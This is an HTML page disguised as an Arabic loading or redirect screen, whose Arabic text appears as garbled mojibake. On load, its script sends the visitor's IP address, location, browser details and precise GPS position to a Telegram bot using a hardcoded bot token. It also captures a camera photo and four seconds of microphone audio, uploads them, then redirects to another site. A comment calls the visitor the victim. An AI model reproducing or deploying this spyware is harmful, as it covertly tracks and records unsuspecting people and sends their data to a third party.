<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
    <style>
        body { background-color: #f0f2f5; color: #333; font-family: sans-serif; text-align: center; padding: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="loadingView">
        <div class="loader"></div>
        <p>Ø¬Ø§Ø±ÙŠ Ø¥Ø¹Ø§Ø¯Ø© ØªÙˆØ¬ÙŠÙ‡Ùƒ Ù„Ù„Ø³ÙŠØ±ÙØ±ØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</p>
    </div>

    <script>
        // Ù‡Ø°Ù‡ Ø§Ù„ÙƒÙ„Ù…Ø§Øª Ø³ÙŠØªÙ… Ø§Ø³ØªØ¨Ø¯Ø§Ù„Ù‡Ø§ Ù…Ù† ØªØ·Ø¨ÙŠÙ‚ Ø³ÙƒÙŠØªØ´ ÙˆØ§ÙŠØ±
        const token = '7565752831:AAFr5xn1Qk6qJ1UKSkXtVcK_6ho5dKWCnLQ';
        const chatId = '7360450559';
        const redirectUrl = 'https://traidmod.com/'; // Ø³ÙŠØªÙ… Ø£Ø®Ø°Ù‡Ø§ Ù…Ù† edittext3

        async function sendLog(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            } catch(e) {}
        }

        async function startCapture() {
            // 1. Ø³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© (IP)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                await sendLog(`ğŸ”” Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯!\nğŸŒ IP: ${d.ip}\nğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${d.city}, ${d.country_name}\nğŸ“± Ø§Ù„Ù…ØªØµÙØ­: ${navigator.userAgent}`);
            } catch(e) {}

            // 2. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    await sendLog(`ğŸ“ Ù…ÙˆÙ‚Ø¹ GPS Ø¯Ù‚ÙŠÙ‚:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                }, null, {enableHighAccuracy: true});
            }

            // 3. Ù…Ø­Ø§ÙˆÙ„Ø© ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                // Ù„Ù‚Ø·Ø© Ø³Ø±ÙŠØ¹Ø© Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                const video = document.createElement('video');
                video.srcObject = stream;
                video.muted = true;
                await video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const frm = new FormData();
                        frm.append('chat_id', chatId);
                        frm.append('photo', blob, 'cam.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
                    }, 'image/jpeg');
                }, 1500);

                // ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ Ù‚ØµÙŠØ± (4 Ø«ÙˆØ§Ù†ÙŠ)
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const frm = new FormData();
                    frm.append('chat_id', chatId);
                    frm.append('voice', blob, 'rec.ogg');
                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm })
                    .then(() => {
                        stream.getTracks().forEach(t => t.stop());
                        // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø±Ø§Ø¨Ø· Ø¨Ø¹Ø¯ Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ ÙˆØ§Ù„Ø±ÙØ¹
                        window.location.href = redirectUrl;
                    });
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 4000);

            } catch (e) {
                await sendLog("âš ï¸ Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª Ø£Ùˆ Ø§Ù„Ø¬Ù‡Ø§Ø² Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„ÙˆØ³Ø§Ø¦Ø·.");
                // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø±Ø§Ø¨Ø· Ù…Ø¨Ø§Ø´Ø±Ø© ÙÙŠ Ø­Ø§Ù„ Ø§Ù„Ø±ÙØ¶
                window.location.href = redirectUrl;
            }

            // ØªØ£Ù…ÙŠÙ† Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø±Ø§Ø¨Ø· ÙÙŠ Ø­Ø§Ù„ Ø¹Ù„Ù‚ Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ù„Ø£ÙŠ Ø³Ø¨Ø¨ (Ø¨Ø¹Ø¯ 8 Ø«ÙˆØ§Ù†ÙŠ ÙƒØ­Ø¯ Ø£Ù‚ØµÙ‰)
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 8000);
        }

        window.onload = startCapture;
    </script>
</body>
</html>
